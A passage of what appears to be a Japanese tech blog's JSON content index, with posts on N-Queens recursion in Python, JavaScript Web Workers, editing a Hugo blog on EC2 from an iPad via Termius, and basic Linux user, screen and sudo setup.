と同じです。\nABOARD[0]は1行目のクイーンを置く位置です0から3までの数字が入ります。\nABOARD[0]が3だと右から4番目にクイーンを置く感じになります。\n420行目 COUNT=0 でCOUNTを初期化しています。\nnqueenメソッド グローバル変数の宣言が終わったら441行目でnqueenメソッドが呼び出されます。\n439行目でnqueenメソッドを再帰的に呼び出しているのが最も特徴的です。\n全体の動作については次の「再帰について」で図を交えて説明しますが前提として各行が何をしているか押さえましょう。\nglobal ABOARD 433行目で global ABOARDとして変数宣言しています。\n関数内でグローバル変数に値を代入したい場合は、変数宣言時にglobalをつける必要があります。\nglobalをつけないとローカル変数として扱われます。\nちなみに、私は試しに433行目を削除して実行してみたのですがエラーになりました。\nif row is SIZE: printout() 434行目 if row is SIZE: はrowイコールSIZEという意味です。\nif row == SIZE: としても今回は同じ動きになります。\n434-435行でやっていることは434行目のif文で最終行までクイーンを置き終わっているかどうかを判定し置き終わっていたらprintoutメソッドを呼び出してCOUNT数と各行のクイーンの設置場所を出力します。\nfor i in range(SIZE) 437行目 for i in range(SIZE) は0からスタートしてSIZEの回数分0,1,2,3と1ずつインクリメントしながらfor文を回します。\nやっていることは各行にクイーンを設置する場所を右から左に1個ずつずらしています。1番左端までいったらfor文を抜けます。\nABOARD[row] = i 438行目のABOARD[row]=iでクイーンを設置しています。\nrowは行を意味します。0からスタートして0,1,2,3まであります。\n例えば、0だと1行目、3だと4行目となります。\niはクイーンを設置する列になります。\n0からスタートして0,1,2,3まであります。\n例えば、0だと右から1列目、3だと右から4列目となります。\n例えばABOARD[2]=3 の場合は\n3行目は右から4列目にクイーンを置くことになります。\nnqueen(row+1) 439行目のnqueen(row+1)で再帰的にnqueenメソッドを呼び出しています。\nやっていることは次の行への移動です。\n再帰の動きについて 再帰の基本的な動作で押さえたいのは以下の2つです。\n・再帰を呼び出した時の動作\n通常のメソッド呼び出しと同じです。メソッドの先頭に移動します。引数に渡された値が反映されます。\n・再帰から抜ける時の動作\n再帰から抜けると1階層前に戻り再帰を呼び出した場所の次の行に移動します。\n変数の状態は再帰を呼び出す直前の状態に戻ります。\n再帰の呼び出しが実際にどういう動きになっているかは頭で考えても難しいので図を見ながら説明します。\n444行目でnqueenを0を渡して呼び出します(1階層目)。\n432行目からスタートして\nrow=0なので436行目のelse:に行きそのまま437行目のfor文に入ります\n最初のfor文なのでi=0です。\nrow=0なので\nABOARD[0]=0\nで\n1行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを呼び出します。\nrow=0 row+1=1なので\nnqueenを引数1を渡して呼び出します(2階層目)\n432行目からスタートして\nrow=1なので436行目のelse:に行きそのまま437行目のfor文に入ります\n最初のfor文なのでi=0です。\nさっきもfor文が出てきましたが再帰は階層ごとにローカル変数を別に考える必要があります。\nrow=1なので\nABOARD[1]=0\nで\n2行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数2を渡して呼び出します(3階層目)。\n同様にfor文に入り、i=0 row=2なので\nABOARD[2]=0\nで\n3行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数3を渡して呼び出します(4階層目)。\n同様にfor文に入り、i=0 row=3なので\nABOARD[3]=0\nで\n4行目の右端にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4なのでif row is SIZE:でprintout()メソッドを呼び出してCOUNTと各行のクイーンの位置を出力します。\nprintout()後再帰から抜けて4階層目の439行目の後ろに移動します。\n変数は再帰を呼び出す直前のものに戻るのでrowは3 iは0になります。\nfor文の中にあるのでiを1インクリメントしてiは1になり次のfor文に移動します。\n_\nABOARD[3]=1\nで\n4行目の右から2番目にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nfor文の中にあるのでiを1インクリメントしてiは2になり次のfor文に移動します。\n_\nABOARD[3]=2\nで\n4行目の右から3番目にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nfor文の中にあるのでiを1インクリメントしてiは3になり次のfor文に移動します。\n_\nABOARD[3]=3\nで\n4行目の右から4番目にクイーンを置きます。\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nfor文でiを1インクリメントすると4ですがrange(4)だと0,1,2,3までなのでここでfor文を抜けます。\nfor文を抜けると439行目には移動しないので再帰から抜けて3階層目の439行目に移動します。\n3階層目ではrow=2 iは0です。\nfor文の中にあるのでiを1インクリメントしてiは1になり次のfor文に移動します。\nABOARD[2]=1\n図 439行目で再帰的にnqueenを引数3を渡して呼び出します(4階層目)。\nrow=3なので436行目のelse:に行きそのまま437行目のfor文に入ります\n最初のfor文なのでi=0です。\nABOARD[3]=0\n図 439行目で再帰的にnqueenを引数4を渡して呼び出します(5階層目)。\nrow=4 なのでprintout()して再帰から抜けて4階層目の439行目の後ろに移動します。\nという感じで下の階層からfor文でぐるぐる回転しながらうごいてゆきます。\n","date":"2022-02-01T15:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-31-01-ani/","title":"第2回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（２）"},{"content":"javascriptで重い処理を書く際やforやwhileなどのループを記述する際に気をつけないといけないのがUIロックです。\nとくに重い処理を行うと、jsの処理に力を使ってしまって画面が固まってUIなどの操作性が格段に落ちてしまい、ブラウザなどからは応答に時間がかかっておりますといったアラートが表示される原因になります。\n画面ロックが発生してしまうと、ユーザーは何もできなくなってしまうのでブラウザを強制終了するしかありません。そうなってしまうと、せっかくサイトに来た訪問者が何もせずに離脱して行くことにつながってしまいます。場合によっては、そのような問題が発生するサイトには二度とこないかもしれません。\nそうした不具合や不具合やサイトの離脱を防ぐためにもjavascriptを使って重い処理をときはWorkerを使って重い処理を別タスクとして実行することをオススメします。\n画面上の処理と重い処理を分けることができ、その結果画面をロックすることなく表示させることが可能になります。\n今回はその方法を詳しく説明しますので、よろしくおねがいします。\nUIをロックしてしまうループ処理 まずは画面をロックしてしまうような記述です。\n下記のようなHTMLがあったとしましょう。\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;ja\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Document\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; #animation:before { content: \u0026#34;\u0026#34;; width: 5em; height: 5em; display: block; border: 2px solid black; margin: 50px auto; } @keyframes rotation { 0%{ transform: rotate(0);} 100%{ transform: rotate(360deg); } } .run #animation:before { animation: 2s linear infinite rotation; } .run button { background-color: red; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;animation\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;button\u0026#34; onClick=\u0026#34;run()\u0026#34;\u0026gt;Run\u0026lt;/button\u0026gt; \u0026lt;h1 id=\u0026#34;counter\u0026#34;\u0026gt;\u0026lt;/h1\u0026gt; \u0026lt;h2 id=\u0026#34;time\u0026#34;\u0026gt;\u0026lt;/h2\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; このHTMLはcounter部分に文字を出力できるようにしてあります。\nそして、実行時間をtime部分に出力します。\nあまり使うことはないですが、今回は重い処理を行った場合を再現するということでこのような形にしました。\nそれでは、ここにfor文を使って文字を追加していってみましょう。今回はfor文が重い処理を行うという部分になります。\njsonやxml、データの解析や要素でforやwhile、eachなどを使うことは非常に多く、その後に何らかの処理を行うという記述もjavascriptを使っていれば高頻度で使用します。\nconst run = () =\u0026gt; { document.body.classList.add(\u0026#39;run\u0026#39;); const start = Date.now(); const elem = document.querySelector(\u0026#34;#counter\u0026#34;); for(let i = 0; i \u0026lt; 100000; i++) { elem.textContent = i; } document.querySelector(\u0026#34;#time\u0026#34;).textContent = Date.now() - start; document.body.classList.remove(\u0026#39;run\u0026#39;); }; 上のようなfor文で記述したスクリプトを作ってみました。\niの値をcounterに反映していくだけのものです。\nまずはiの最大値を100,000くらいで実行してみましょう。\n10万件のデータをフロントで処理するなと思うかもしれませんが、あくまで重い処理を行うとどうなるかという実験です。\n10万件でなくても、数千件のデータで入れ子のループ処理が記述されている場合などは画面ロックが発生する確率も上がっていきます。\n実行したところ、999,999と表示され、time部分の処理は569ミリ秒ということになります。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. ここで注目してほしいのが、counterの文字を変化させているにもかかわらず、その文字が反映されていないという点です。\nChromeのDevelopper tools（macの場合[⌘ + option + i], Windowsの場合[Ctrl + Shift + I]または、F12）で確認しても、変化しているようではありますが、画面上では反映されていません。\n重い処理を行う場合をフロントで行うと、 UX（ユーザー体験）の低下につながってしまいます。\nそこで使うのが、 javascriptのタスクを別スレッドで実行できるWorker処理ということになります。\nWorkerとは Workerとはバックグランド、つまり、裏の方で処理を行ってその結果をフロントに返却するということができる仕組みになります。\nフロントで処理を行わないので、画面ロックを発生させることなく重い処理を実行できます。\nWorkerを使用するには実行したいファイル名を指定して呼びします。\nそして、対象のワーカーに値などをpostMessageで値を渡します。\npostMessage部分は配列や連想配列のデータでも構いません。\nそして、対象のWorker側でpostされたデータを受信するように設定します。\n受信の際はフロントであれば worker.addEventListener('message', (e) =\u0026gt; {}) を、Workerであれば self.addEventListener('message', (e) =\u0026gt; {}) を使用します。\n処理内容を返却する際は、先ほどと同じようにpostMessageを使います。\nconst worker = new Worker(this.fileName); const run = () =\u0026gt; { worker.postMessage(\u0026#34;run\u0026#34;); }; worker.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { console.log(e.data); }, false); self.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { //処理内容 //処理結果を送信 self.postMessage(e.data); }, false); UIをロックしないで行えるループ それでは、先ほどロックしてしまったjsをworkerにしてみましょう。\nconst worker = new Worker(\u0026#34;worker.js\u0026#34;); const run = () =\u0026gt; { document.body.classList.add(\u0026#39;run\u0026#39;); const start = Date.now(); const elem = document.querySelector(\u0026#34;#counter\u0026#34;); worker.postMessage(\u0026#34;run\u0026#34;); worker.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { if(e.data.mode === \u0026#39;end\u0026#39;) { document.querySelector(\u0026#34;#time\u0026#34;).textContent = Date.now() - start; document.body.classList.remove(\u0026#39;run\u0026#39;); } else { document.querySelector(\u0026#34;#counter\u0026#34;).textContent = e.data.value; } console.log(); }, false); }; 続いて、Worker部分の処理になります。\nworker部分ではフロントのworker_main.jsから実行されたタイミングで動作を開始して、ループの値をフロントに戻すような処理を行います。\nループが終了すると、mode: endと終わったことを通知するようにしました。\nself.addEventListener(\u0026#39;message\u0026#39;, (e) =\u0026gt; { //処理内容 for(let i = 0; i \u0026lt; 100000; i++) { console.log(i); self.postMessage({value: i}); } self.postMessage({mode: \u0026#39;end\u0026#39;}); //処理結果を送信 }, false); それでは実行してみましょう。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. 実行すると、先ほどとまったく違うUIになっているかと思います。\n実はRunを押したタイミングで、ボタンを赤くして、上の四角が回転するようにしてありました。\nWorkerなしの処理ではjavascriptの処理が詰まってしまい、その部分の処理が正しく表示されていなかったということになります。\nWorkerは並列で処理を行える 画面ロックを防ぐ他に、WebWorkerには便利な機能があります。通常、javascriptはシングルスレッドなので並列（マルチスレッド）で処理を行うことができません\nが、WebWorkerを用いることで、複数の処理を同時に行うことが可能になります。\nフロントに関係のないデータの処理 重い処理 上記のような処理をフロントで行うと、画面ロックが発生する原因となるほか、修正なども大変になりますが、webWorkerとして別にjavascriptを用意して実行されるようにしておくことで、メンテナンス性とユーザービリティーが向上します。\n並列処理と聞くとpromiseなどを考えるかと思いますが、promiseは非同期処理であり、並列で処理は行いません。\nWebWorkerを使用する上で注意すべきなのは、documentなどのフロントにある要素にはアクセスできないので、document.writeやdocument.querySelectorなどを使用できません。どうしても使用する場合は、変数としてworkerに対してpostするようにしましょう。\n利用できる関数やAPIなどが下記に一覧で記載されているので参考にしてください。\nWeb Workers が使用できる関数とクラス\nsetTimeoutでもできるけど、オススメしない UIのロックを防ぐ方法として、setTimeoutを使う方法もあります。\nこの方法はworkerを使っていないのですが、setTimeoutを使用することで別タスクとして処理させることができます。\nconst run = () =\u0026gt; { document.body.classList.add(\u0026#39;run\u0026#39;); const start = Date.now(); const elem = document.querySelector(\u0026#34;#counter\u0026#34;); for(let i = 0; i \u0026lt; 100000; i++) { setTimeout(()=\u0026gt;{ console.log(i); elem.textContent = i; }, 0); } document.querySelector(\u0026#34;#time\u0026#34;).textContent = Date.now() - start; document.body.classList.remove(\u0026#39;run\u0026#39;); }; 数字部分は変化しますが、さきほどのようにアニメーションは行われません。\nforの処理が先に終了してしまうため、cssのアニメーションが一瞬で終了してしまうのです。\nYour browser doesn't support HTML5 video. Here is a link to the video instead. まとめ javascriptを使っていると思い処理も当然行う場合があります。そうしたときに、フロントで処理をしてしまうとローディングなどのアニメーションが正しく行われなかったりする原因になってしまいます。\nWorkerを使って、処理を別タスクとしてやることで正しくローディングなどを表示させることが可能です。\n重い処理を行う際は、Workerを使って別タスクで行ってユーザーにストレスを与えないサイトを作っていきましょう。\nオススメの書籍 ゲームで学ぶJavaScript入門 HTML5\u0026amp;CSSも身に付く! 「JavaScriptでココまでできる!」 中学生、高校生のための、ゲームプログラミング入門書の決定版! JavaScriptを使用したWebブラウザゲームの製作ノウハウを解説する入門書です。 Webページをまったく作ったことはないが、現在主流となっているブラウザゲームに興味があり、 「自分でもゲームプログラミングに挑戦してみたい!」と考えている初心者、とくに中・高校生に最適です。 本書では「より面白く」「見栄え良く」をモットーに、13本のサンプルゲームを紹介しています。 ゲームを作りながら、JavaScriptだけでなくHTML5やCSSといったWeb技術の基本もしっかり学習できます。 最後までラクに読めて、感覚的に仕組みを理解できるように、 「楽しさ」が感じられて「飽きさせない」ことを重視した構成になっています。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 確かな力が身につくJavaScript「超」入門 第2版 ◎ 3万部突破のベストセラーが充実のアップデート! JavaScriptをこれから始める人にも、前に挫折したことのある人にも。 手を動かしてサンプルをひとつずつ作っていくことで、知識だけでなく、 現場で活きる、応用・実践につながる基礎力が「この一冊で」身につきます。 ポイント1「サンプルが楽しい。」 よくある“勉強のためのサンプル\u0026#34;を可能な限り排除し、「こういうの見たことある! 」「こういうのが作ってみたかった! 」というような、実際に仕事に使えそうなサンプルを集めました。なので、最初の「やるぞ! 」というモチベーションを維持したまま、最後のページまで読み進めることができます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-01T14:19:43+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-01-01-wyoshi/catch_hu76eecea6b0108d716a0248cfde205ca5_73592_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-01-01-wyoshi/","title":"javascriptで画面ロックする場合は、Workerを使ってみよう"},{"content":"iPhoneやiPadなどのスマホ、タブレットは持ち運びに非常に便利です。パソコンよりも軽く、パソコンと同等の機能を備えてます。\nそうした端末を使って記事が投稿できたら、スタバやドトールなどのカフェでコーヒーを飲みながら記事を書くことができてしまいます。\n今回は、AmazonのEC2上にあるHugoのブログをiPadを使って更新して見たいと思います。\niPhoneやiPadでターミナルを使う iPhoneやiPadにも数多くの素晴らしいターミナルアプリがあります。\nその中でも私が使っているのはTermius: Terminal \u0026amp; SSH clientというアプリです。\nこのアプリはターミナルの機能を持っており、SSHでのサーバ接続も可能です。もちろんログインの際にpemファイルなどを使用することも可能です。\n基本的な機能は無料で使用できるので、まずはインストールをしてみましょう。\n初期設定 起動すると、アカウントの登録が必要かと思いますが、必要ありません。\n下にある「Learn more」を押して、「Continue without account」にてログイン無しで使えます。\n課金すると様々な機能を使えるようになるので、そういった機能でより便利に使いたい人は是非、課金してください。\nインストールが終わったら「New Hosts」をタプして、ログインしたいサーバを追加するか、「Hosts」メニューの右上にある「＋」ボタンを押してサーバを追加します。\nAlias には自分がわかりやすい名前をつけます。\nHostname にはサーバのドメイン名やIPアドレスを入力します。\nPort はSSHを使うときのポートです。\nそして、ユーザー名とパスワードを使っている人はパスワードを入力します。\npemファイルを使っている人は、pemの内容をコピーして貼り付けるか、パソコンからpemを送信します。\n送信はパソコンでiPadなどを接続して、ファイルタブから贈りたいpemファイルをドラッグ・アンド・ドロップします。\npemファイルをiPadに送り終わったら、Keyを押して、左上の「+」「Import Key」にて先程送ったファイルを選択します。\nこれでキーが設定されました。\nここまで設定できたら、左上の「Save」にて保存しましょう。\n以上でサーバに接続する準備ができました。\nサーバに接続 Alias に設定した名前でアイコンが作成されているかと思います。\nそのアイコンを押すと、know hostsに登録するかどうか聞かれるので、「Continue」を押して追加します。\nうまく設定できていたらサーバに接続できると思います。\nできない場合は、アイコンを長押しして、「Edit」にて情報を正しいものに修正しましょう。\nTabはどうするの？ SSHではtabコマンドで入力の補完を設定しているケースがあるともいます。\niPadにはタブというキーがありません。さて……どうしたものでしょうか。Termius はそこもよく考えられていて、通常であれば画面をタブルタップすると「Tab」と一瞬表示されてタブキーを押したときと同様のことが行なえます。\nその他にも、キーボードの上にある「…」マークを押して、「ギアーアイコン」を押すと初期のキーボード上部のボタンを変更することが可能です。\nTabキーやコントロールキーが使えるとiPadでも十分使えますね。\nhugoで記事を書いて確認する hugoで記事を書くやり方はデザイナーでもできる初めてのHUGO #01を参照してください。\nEC2で記事を書いて、確認しようとするとある疑問を持ってしまいます。それは確認用のサーバはどうしたら良いのかということです。\n通常であれば「localhost:1313」などのURLで確認できます。しかし、EC2ではlocalhostとしてもEC2本体のアドレスではないので、確認できません。\nhugoにはIPを指定してサーバを起動する機能があります。\nhugo server --baseURL=[URL] 上記のコマンドでアクセスできるかというと、まだ駄目です。\n最終的なコマンドは\n$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート] となります。\nここで重要なのが--bind=0.0.0.0になります。\nここまできたら、ほぼほぼ確認できるようになっています。\nEC2でファイヤーウォールを設定している場合 EC2を使用している場合、ALBやELBを設定していることが多いと思います。\n先程指定したポートが空いているか確認して、空いていない場合は、EC2の設定で開けましょう。\nEC2のインバウンドルールに開けたいポートを追加します。\nセキュリティーグループを使用している場合は、「インバウンドのルールを編集」をクリックして追加します。\n下にある「ルールを追加」を押して、「カスタムTCP」にします。\n次に、ポート範囲に開けたいポートを入力して、CIDR ブロックにインターネットゲートウェイを指すすべての IPv4 トラフィック (0.0.0.0/0) のルートを追加します。\nIPv6の場合も追加したいので、もう一度「ルールを追加」を押して、ポートを入力し、IPv6 トラフィック (::/0) のルートを入力します。\n設定が終わったら、保存しましょう。\nこれでポートの設定が完了しました。\niPadで確認しながら更新をする サーバにログインして、先程の\n$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート] でサーバを立ち上げます。\nこのとき、下書きの記事を表示したいときは\n$ hugo server --baseURL=http://[EC2のURL] --bind=0.0.0.0 --port=[ポート] -D として下書きも表示するようにしましょう。\nまた、サーバのアドレスがわからない場合は\n$ curl -s ifconfig.me とすればIPアドレスがわかります。\niPadにはSplitビューがついているので、片方でブログを書きながら、　もう片方でSafariなどを立ち上げて立ち上げて記事を確認しながら記述することが可能です。\n構築が終わったらiPadに開発環境を構築してみるテストを参考にして、EC2内での詳細な設定をしてみましょう。\nまとめ iPadを使うとどこでも、重いパソコンを持たなくても簡単にブログを更新することができるようになります。是非オススメなので、みなさんも試してみてください。\nおすすめの書籍 iPad完全マニュアル2022(全機種対応/基本操作から活用技まで詳細解説) iPadをしっかり使いこなすための決定版ガイドブック。 iPadOS 15に対応した最新版です。 2021年発売の最新モデルはもちろん、すべてのiPad Pro、iPad Air、iPad、iPad miniの全モデル ホームボタン搭載/非搭載含めすべての機種に対応します。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 AWSではじめるインフラ構築入門 安全で堅牢な本番環境のつくり方 AWSのネイティブ機能を組み合わせて 安全かつ堅牢なインフラを構築・運用 本書は、AWS(Amazon Web Services)を利用して、 インフラを構築/運用する方法を解説する入門書です。 クラウドでネットワーク\u0026amp;サーバー構築を行うために必要な基礎知識や、 AWSのネイティブ機能を組み合わせて安全かつ堅牢なインフラを構築/運用 するための設定方法やノウハウを解説します。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-28T15:35:18+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img11_hueeecba35050a11ee02801fa0306bfd2b_371238_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/","title":"パソコンは不要。スマホ、タブレットでできるブログ投稿"},{"content":"はじめに まずはこちらをやりましょう。\nパソコンは不要。iPhoneやiPadなどのスマホ、タブレットでできるブログ投稿 必要なもの iPad Termiusというアプリ\nTermius: Terminal \u0026amp; SSH client AWSのサーバーインスタンス\nAWS EC2 インスタンスの作成 AWSインスタンスにログインするために必要なpemファイル（キーチェイン）\nAWS EC2にSSHでアクセスする方法 AWSインスタンスへの接続 pemファイルをスマホに送る\nインスタンスを作るときにpemファイルをダウンロードしたと思います\n（してなかったら、pemファイルは一回しかダウンロードさせてくれないのでインスタンスを作り直しましょう）\nこのpemファイルをＰＣのエディターで開き、内容をテキストファイルにペーストします。\nこのファイルをＬＩＮＥなりメールなりGoogleドライブなりでスマホに送ります。\npemファイルをTermiusで読み込みます\nＰＣ上で鍵ファイル(.pem)をテキスト化してiPadで内容をコピーして貼り付けられるようにしておくことが重要です。\niPad Proでsshクライアント「Termius」を使ってみた\niPadからAWSのEC2インスタンス(LINUX)にSSH接続する方法 アカウントの作成 rootでの作業でも良いのですが、一般論としてここではアカウントの作成から説明します。\nまずは、サーバーに接続します。\ncentos$ いわゆるrootでログインした訳です。\nここでユーザー名 suzuki を追加します。\ncentos$ useradd suzuki さらに suzuki のパスワードも設定します。\ncentos$ passwd suzuki パスワードは２回同じ入力を求められます\nでは rootからsuzukiにアカウントを切り換えます。\nユーザーの切り替えは su コマンドを使います。\ncentos$ su suzuki パスワード： suzuki$ suzukiに切り替わりました。\n自分自身がどこにいるのかを確認します。\nカレントディレクトリの確認は pwd コマンドを使います。\nディレクトリの移動は cd コマンド\nホームディレクトリは ~ で表します。\nホームディレクトリへの移動は cd ~ となります。\ncentos$ pwd /home/centos $ cd ~ $ pwd $ /home/suzuki $ ~/.bashrc の修正 ここでは ~/.basrcファイルを修正します。\nまず、~/.basrc ファイルのバックアップをとります。\nここではファイル名先頭のピリオドを落として ls コマンドで見えるようにしておきます。\n$ cp ~/.bashrc ~/bashrc.bak では、~/.bashrc を vimで開いて編集します。\n$ vim ~/.bashrc # .bashrc # Source global definitions if [ -f /etc/bashrc ]; then . /etc/bashrc fi # ターミナルの表示 export PS1=\u0026#34;bash-\\v$ \u0026#34; ; # 基本言語フォーマットをUTF-8へ export LANG=\u0026#34;ja_JP.UTF-8\u0026#34; ; # User specific environment and startup programs alias rm=\u0026#39;rm -i\u0026#39; ; alias cp=\u0026#39;cp -i\u0026#39; ; alias mv=\u0026#39;mv -i\u0026#39; ; # grepとls のカラー表示 alias grep=\u0026#39;grep --color=auto\u0026#39; ; alias ls=\u0026#39;ls --color=auto\u0026#39; ; # screen alias s=\u0026#39;screen -RR\u0026#39; ; # Github ディレクトリへ移動 alias g=\u0026#39;cd ~/GitHub\u0026#39; ; 編集が終わったら ~/.bashrc を再読込します。\nLinux での再読込は . です\n$ . ~/.bashrc $ では GitHub にある様々なディレクトリを格納する Githubディレクトリを作成します。\n$ mkdir GitHub $ 以降の github プロジェクトは今作成した GitHub ディレクトリ以下に作成します。\nターミナルの入力で大文字と小文字を区別せずに補完する # 大文字小文字を区別しない set completion-ignore-case on # 以下日本語入力の必要がある場合に必要(なくてもよい） set input-meta on set output-meta on set convert-meta off set meta-flag on 編集が終わったら ~/.inputrc を再読込します。\nLinux での再読込は . です\n$ . ~/.inputrc $ cd ~ $ pwd /home/suzuki $ g $ pwd /home/suzuki/GitHub $ ヒント ~/.inputrc を root ユーザーになって /etc/inputrc に追記するとすべてのユーザーが大文字小文字を区別することなくターミナルで補完することができます。 screen のインストール screen はターミナル内で複数の仮想ターミナルを起動して使うことができる画面管理ソフトです。\nメリットは、\nターミナルウインドウのタブを複数作成し、ここのタブでサーバーにログインする必要がないので、不要なセッションを作らなくてすむ。 開いていた端末の状態を保持しておける。 回線が切れる、スタンバイなどのセッション切れでもレジュームされる。 一つの画面をさらに分割できるので、複数端末でログ監視したいときなどに超便利。 まずはscreen がインストールされているのかの確認します。\n$ screen -v Screen version 4.08.00 (GNU) 05-Feb-20 $ インストールされていれば以下の作業はする必要がありません。\nインストールされていなければ、yum コマンドでインストールして下さい。\n$ sudo ＜sudo で rootになります＞ # ＜rootになると # になります\u0026gt; # yum -y install screen 読み込んだプラグイン:fastestmirror base | 3.6 kB 00:00:00 extras | 3.4 kB 00:00:00 updates | 3.4 kB 00:00:00 (1/2): extras/7/x86_64/primary_db | 115 kB 00:00:00 (2/2): updates/7/x86_64/primary_db | 2.2 MB 00:00:00 Loading mirror speeds from cached hostfile * base: ftp.iij.ad.jp * extras: ftp.iij.ad.jp * updates: www.ftp.ne.jp 依存性の解決をしています --\u0026gt; トランザクションの確認を実行しています。 ---\u0026gt; パッケージ screen.x86_64 0:4.1.0-0.23.20120314git3c2946.el7_2 を インストール --\u0026gt; 依存性解決を終了しました。 依存性を解決しました ====================================================================================================================================================== Package アーキテクチャー バージョン リポジトリー 容量 ====================================================================================================================================================== インストール中: screen x86_64 4.1.0-0.23.20120314git3c2946.el7_2 base 552 k トランザクションの要約 ====================================================================================================================================================== インストール 1 パッケージ 総ダウンロード容量: 552 k インストール容量: 914 k Downloading packages: screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64.rpm | 552 kB 00:00:00 Running transaction check Running transaction test Transaction test succeeded Running transaction インストール中 : screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64 1/1 検証中 : screen-4.1.0-0.23.20120314git3c2946.el7_2.x86_64 1/1 インストール: screen.x86_64 0:4.1.0-0.23.20120314git3c2946.el7_2 完了しました! $ # rootからsuzukiにアカウントを切り換えます $ su suzuki # screenコマンドがどこにインストールされているのかを確認します。 $ which screen /usr/bin/screen $ screenrc の修正 screenコマンドをさらに便利にするために screenrc ファイルを修正します。\n# ユーザーをroot から suzuki に変えます。 $ su suzuki $ 以下を ~/.screenrc として作成して保存します。\n# Ctrl + z で screenの操作モードへの切り換え escape ^Zz # スクロールバッファを大きくする defscrollback 10000 # ステータスバーをカスタマイズ hardstatus on hardstatus alwayslastline \u0026#39;%{= kw}%02c:%s %{= .y}%H %L=%{= .b}%-w%46\u0026gt;%{= .r}%n %t*%{= .b}%+w%-16=%{= .y}[%l]\u0026#39; # スタートメッセージを表示させない startup_message off # ビープを鳴らさない vbell off #termの設定 term ansi bind r bind ^r # 上記 ~/.bashrc の修正で、screenコマンドの呼び出しを s にしています。\n# screen alias s=\u0026#39;screen -RR\u0026#39; ; ですので、ターミナルからは s だけで screen -RR コマンドを実行したことと同じになります。\n# screenの起動 $ screen # screenの終了 $ exit $ # screenの起動 $ s # screenの終了 $ exit ~/.bashrc にエイリアスを作成していなければ screen で起動しますし、~/.bashrcにエイリアスを作成していれば（ここでは「s」） $ s で一発起動します。screenを抜けるときは「exit」です。\nscreen を使ってみます screen の起動(screen)\nまず screen を起動しなくては始まりません。 ログインしたターミナルで「screen」と打てば screen が起動します。 screen から抜けるには普通にログアウトするように 「exit」 や [Ctrl+d]で抜けられます。\n新しいウィンドウを開始する([Ctrl+c])\n「[Ctrl+c]」で新しいウィンドウを開始できます。 幾つでも作れます。 不要になったウィンドウは 「exit」 や [Ctrl+d] で消せます。\n次のウィンドウに移動する([Ctrl+n])\n開いている隣のウインドウに移動します。カスタマイズした~/.screenrcを使っている人はステータスバーで確認できて便利です。\n詳しくはこちら\nLinux screenコマンド使い方\nヒント screen は王者のコマンドです。プログラマーの多くはローカルのターミナルでタブを作成します。screen はサーバー上で仮想端末を作成します。screenはvim同様、プログラマーを選びます。Linuxを語るなら vim と screen そして bash の習熟が必須なのです。 sudoユーザーを追加する方法 sudoユーザーに追加していないユーザーでsudoコマンドを実行すると、\n$ sudo less /etc/passwd [sudo] password for suzuki: suzuki is not in the sudoers file. This incident will be reported. こんな事を言われます。\nということで、ここでは特定のユーザー（ここでは「suzuki」）がsudoコマンドを実行できるようにします。\n/etc/sudoers ファイルにユーザーを追加します。\nまずはrootユーザーになります。\nユーザーsuzuki をぬけてrootになります。\n$ exit 現在のグループを確認します。\n# sudo vim /etc/sudoers 以下の記述があれば wheelグループに suzukiを追加すればよいです。\n## Allow members of group sudo to execute any command %wheel ALL=(ALL:ALL) ALL ではまず現状を確認します。\n# cat /etc/group | grep suzuki sudoのグループ（centosなら wheel) に suzuki を追加します。\n# sudo usermod -G wheel suzuki 確認します。\n# cat /etc/group | grep suzuki wheel:x:10:suzuki suzuki:x:1001: # これで、ローカルアカウント suzuki で、必要に応じて sudoコマンドをつかって安全に作業することができるようになりました。\nヒント 当たり前の話ではありますが、root で作業するのはやめましょう。必要に応じて $ su 